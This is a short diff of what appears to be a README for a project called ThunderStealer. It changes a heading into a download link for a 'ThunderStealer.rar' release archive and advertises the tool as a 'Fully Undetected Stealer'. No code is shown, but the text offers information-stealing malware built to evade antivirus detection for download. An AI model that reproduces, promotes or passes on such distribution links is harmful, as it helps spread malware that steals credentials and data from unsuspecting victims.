@@ -1,4 +1,4 @@
-  <h3 align="center">Click for the download</h3>
+  <h3 align="center"><a href="https://github.com/Thundercmd/ThunderStealer/releases/download/thunderstealer/ThunderStealer.rar">Download</a></h3>
 
   <p align="center">
     Fully Undetected Stealer.
